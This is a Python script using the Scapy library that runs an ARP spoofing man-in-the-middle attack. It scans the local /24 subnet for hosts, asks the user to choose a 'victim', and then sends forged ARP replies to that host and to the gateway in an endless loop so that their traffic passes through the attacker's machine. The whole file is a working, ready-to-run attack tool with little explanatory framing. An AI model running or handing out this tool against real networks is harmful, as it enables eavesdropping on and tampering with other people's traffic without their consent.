import scapy.all as scapy
import random
import socket
import time

#find all other devices on the network and generate a list of their IPs
#pick an IP address at random from that list
#send packets to FF:FF:FF:FF:FF:FF (global transmission) to update the ARP tables of each machine in the network

ipList=[] #list that stores all the available IP'S
macList=[] #list that stores all the available MAC addresses
#method to scan the network by creating an ARP broadcast to see all the available connections on the network
def scan_network(ips):
    arp = scapy.ARP(pdst = ips)
    ether = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    broadcast = ether/arp
    ans, unans = scapy.srp(broadcast, timeout = 5, verbose = False) #ans recieves all the packets that are responded too, unans unresponded packets, times out after 5 seconds.
    for x in ans:
        #print(x[1].psrc + " " + x[1].hwsrc)
        ipList.append(x[1].psrc)
        macList.append(x[1].hwsrc) #insert the IP/MAC into respective list
#method to retrieve the MAC address of a given IP
def getMAC(targetip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1, pdst = targetip)  #Create the ARP request to the IP in order to obtain the MAC 
    targetmac = scapy.srp(packet, timeout=2, verbose = False)[0][0][1].hwsrc #sends the packket with the sender hardware access
    return targetmac
#method to start spoofing ARP packets
def spoofarp(targetip, targetmac, sourceip):
    spoof = scapy.ARP(op=2, pdst = targetip, psrc = sourceip, hwdst = targetmac) #creates the arp packet with the given mac/IP addresses
    scapy.send(spoof, verbose=False) #sends packet to the router to intercept

def Main():
    print("[+] Enter Gateway IP: ")
    gatewayIP = input() #retrieve the gateway IP from the user
    print("[-] Scanning network for victims...")
    gatewayMAC = getMAC(gatewayIP) #retrieve the MAC address from the IP
    networkToScan = gatewayIP + "/24"  #add subnet mask
    scan_network(networkToScan)
    print("[+] Enter the number representing the index of the IP you wish to spoof")
    print(ipList)
    while True:
        temp = int(input())
        if(temp < 0 or temp > len(ipList)-1): #ensures valid index is selected from the list
            print("[!] Invalid index")
        
        else:
            targetIP = ipList[temp] #set target MAC/IP to the user selection
            targetMAC = macList[temp]
            print("[-] Target IP is "+targetIP)
            print("[-] Target MAC is "+targetMAC)
            break
    
    print("[-] Spoofing...")
    while True: #infinite loop
        spoofarp(targetIP, targetMAC, gatewayIP) #swap the user MAC with the spoofed Mac adress
        spoofarp(gatewayIP, gatewayMAC, targetIP)
        time.sleep(1)

if __name__ == '__main__':
    Main()
